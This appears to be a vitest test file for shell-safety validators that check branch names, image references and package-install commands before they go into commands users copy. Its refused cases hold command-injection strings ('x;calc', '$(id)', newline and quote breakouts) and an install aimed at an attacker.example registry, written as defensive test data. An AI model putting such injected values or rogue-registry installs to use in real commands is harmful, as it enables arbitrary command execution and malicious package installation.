import { describe, expect, it } from 'vitest';
import { isPlainBranch, isPlainCommand, isPlainImage } from './shell';

/**
 * Values put in a command the user copies must read the same in POSIX shells,
 * PowerShell, cmd.exe and fish: only characters none of them treats specially.
 */
describe('isPlainBranch', () => {
  it.each(['main', 'feature/login-form', 'release-1.2.3', 'fix_crash', 'renovate/lodash-4.x', 'v2.0', 'HEAD'])(
    'accepts %j',
    (value) => expect(isPlainBranch(value)).toBe(true),
  );

  it.each([
    '',
    '-o',
    'x’;calc;’',
    "x';calc;'",
    'x&calc',
    'x|y',
    'x%PATH%',
    'x^y',
    'x\\',
    'x`y`',
    'x$y',
    'x y',
    'x\ty',
    'x\ny',
    'été',
    'x=1',
    'x+y',
    'x@y',
    'x:y',
    '<x',
    '~x',
    'x*',
  ])('refuses %j', (value) => expect(isPlainBranch(value)).toBe(false));
});

describe('isPlainImage', () => {
  it.each(['nginx', 'ghcr.io/acme/api:v2', `registry.example:5000/a/b@sha256:${'a'.repeat(64)}`])(
    'accepts %j',
    (value) => expect(isPlainImage(value)).toBe(true),
  );

  it.each(['', '-x', '@x', ':x', 'x&y', 'x;y', 'x’', 'x y'])('refuses %j', (value) =>
    expect(isPlainImage(value)).toBe(false),
  );
});

describe('isPlainCommand', () => {
  it.each([
    'npm install lodash@4.17.21',
    'pip install requests==2.31.0',
    'go get golang.org/x/net@v0.23.0',
    'dotnet add package Newtonsoft.Json --version 13.0.3',
    'composer require monolog/monolog:3.5.0',
    'gem install rails -v 7.1.3',
    'cargo add serde@1.0.197',
  ])('accepts %j', (value) => expect(isPlainCommand(value)).toBe(true));

  it.each([
    'npm install x;calc',
    'npm install x&&calc',
    'npm install $(id)',
    'npm install --registry=https://attacker.example x',
    'npm install @scope/x@1.0.0',
    'npm install x’;calc',
    '# Update x to version 1 in pom.xml',
    'npm  install x',
    'npm install x\ncalc',
    '',
  ])('refuses %j', (value) => expect(isPlainCommand(value)).toBe(false));
});
